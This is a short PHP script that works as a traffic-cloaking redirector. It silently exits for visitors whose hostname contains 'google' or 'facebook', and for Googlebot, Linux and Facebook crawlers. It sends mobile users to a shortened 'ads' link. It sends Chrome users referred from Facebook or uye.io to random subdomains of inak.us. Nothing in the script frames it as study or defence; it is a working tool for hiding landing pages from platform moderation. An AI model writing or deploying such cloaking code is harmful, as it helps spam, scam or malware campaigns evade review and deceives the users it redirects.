<?php
function generate_name($length){
    $rname = "";
    $sesli = "aeiou";
    $sessiz = "bcdfghjklmnprstvyz";
    $rname = rand(1,2) == 1?$sessiz[rand(0,strlen($sessiz)-1)]:$sesli[rand(0,strlen($sesli)-1)];
    for($n=0;$n<$length;$n++){
        if(in_array($rname[strlen($rname)-1], str_split($sesli))){
            $rname .= $sessiz[rand(0,strlen($sessiz)-1)];
        }else{
            $rname .= $sesli[rand(0,strlen($sesli)-1)];
        }
    }
    return $rname;
}
require_once('Mobile_Detect.php');
require_once('Browser.php');
$detect = new Mobile_Detect;
$browser = new Browser();
$ads = "http://goo.gl/c1u740";
$isref = false;
$filename = generate_name(rand(5,8)).".html";
if(!isset($_SERVER["HTTP_REFERER"])){
  $_SERVER["HTTP_REFERER"] = "";
}
if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
    $isref = true;
}
if (strpos($_SERVER["HTTP_REFERER"], 'uye.io') !== false){
    $isref = true;
}
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$hostname = gethostbyaddr($ip);
$host_verify = true;
$blacklist = array(
  "google",
  "facebook"
);
foreach ($blacklist as $black) {
  if(strpos($hostname, $black) !== false){
    $host_verify = false;
  }
}
if($host_verify == false){
  exit();
}

if($detect->isMobile() || $browser->isMobile()){
  header("Location:".$ads);
  exit();
}else if($browser->getBrowser() == Browser::BROWSER_GOOGLEBOT) {
  exit();
}else if($browser->getPlatform() == Browser::PLATFORM_X11 || $browser->isFacebook()){
  exit();
}else if($browser->getBrowser() == Browser::BROWSER_CHROME){
  if($isref == true){
    header("Location:http://".generate_name(rand(5,6)).".inak.us/".$filename);
  }else{
    exit();
  }
  exit();
}else{
  exit();
}
?>
